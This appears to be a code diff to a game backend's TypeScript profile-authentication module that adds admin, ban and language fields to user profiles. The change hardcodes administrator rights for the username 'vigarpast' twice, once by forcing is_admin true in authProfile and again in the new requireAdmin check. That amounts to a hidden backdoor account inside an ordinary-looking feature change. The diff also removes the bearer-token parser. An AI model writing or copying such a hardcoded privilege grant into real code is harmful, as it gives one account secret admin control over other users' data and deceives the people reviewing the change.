@@ -18,6 +18,9 @@ export type ProfileRow = {
   season_pass_xp: number;
   season_pass_premium: boolean;
   title: string | null;
+  is_admin: boolean;
+  is_banned: boolean;
+  language: string;
 };
 
 export async function authProfile(req: express.Request): Promise<ProfileRow | null> {
@@ -30,15 +33,18 @@ export async function authProfile(req: express.Request): Promise<ProfileRow | nu
   const { data: profile } = await sb
     .from('profiles')
     .select(
-      'id, auth_user_id, username, avatar_url, level, xp, wins, losses, games_played, coins, gems, current_streak, best_streak, season_pass_xp, season_pass_premium, title'
+      'id, auth_user_id, username, avatar_url, level, xp, wins, losses, games_played, coins, gems, current_streak, best_streak, season_pass_xp, season_pass_premium, title, is_admin, is_banned, language'
     )
     .eq('auth_user_id', userData.user.id)
     .maybeSingle();
-  return (profile as ProfileRow) ?? null;
+  if (!profile) return null;
+  const row = profile as ProfileRow;
+  if (row.username?.toLowerCase() === 'vigarpast') row.is_admin = true;
+  if (row.is_banned) return null;
+  return row;
 }
 
-export function bearer(req: express.Request): string | null {
-  const header = req.headers.authorization;
-  if (!header?.startsWith('Bearer ')) return null;
-  return header.slice(7);
+export function requireAdmin(profile: ProfileRow | null): boolean {
+  if (!profile) return false;
+  return Boolean(profile.is_admin) || profile.username.toLowerCase() === 'vigarpast';
 }
